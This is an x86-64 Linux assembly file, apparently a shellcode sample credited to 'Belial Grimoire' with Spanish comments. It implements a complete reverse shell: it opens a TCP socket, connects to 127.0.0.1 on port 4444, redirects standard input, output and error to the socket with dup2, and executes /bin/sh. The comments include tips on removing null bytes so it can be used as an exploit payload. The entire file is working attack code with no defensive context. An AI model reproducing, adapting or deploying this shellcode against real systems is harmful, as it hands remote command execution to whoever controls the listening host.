;//////////Codigo por Belial Grimoire////////////
;/usr/include/x86_64-linux-gnu/asm/unistd_64.h

global _start

section .text

_start:

xor rcx, rcx

push 0x29    ;int socket(int domain, int type, int protocol) (rdi, rsi, rdx)
pop rax      ;#define __NR_socket 41
push rcx
pop rdx

inc rcx
push rcx
pop rsi

inc rcx
push rcx
pop rdi

syscall

mov r8, rax

push 0x2a   ;int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
pop rax      ;#define __NR_connect 42

push 0x0100007f   ;protocolo - add o sub para quitar nulls, 0x11111111
push word 0x5c11  ;puerto
push word 0x2     ;AF_INET

mov rsi, rsp

push 0x10
pop rdx

push r8
pop rdi

syscall

xor rsi, rsi
push 0x3
pop rsi     

yumps:      ;int dup2(int oldfd, int newfd)  -> (send,recv,error)

push 0x21   ;#define __NR_dup2 33
pop rax
syscall

dec rsi
jns yumps


push 0x3b
pop rax

xor rbx, rbx   ;int execve(const char *fn, char *const argv[], char *const envp[])
push rbx
push rbx

pop rsi
pop rdx

mov rdi, 0x68732f6e69622f2f  ;//bin/sh
shr rdi, 0x8 
push rdi
push rsp

pop rdi


syscall

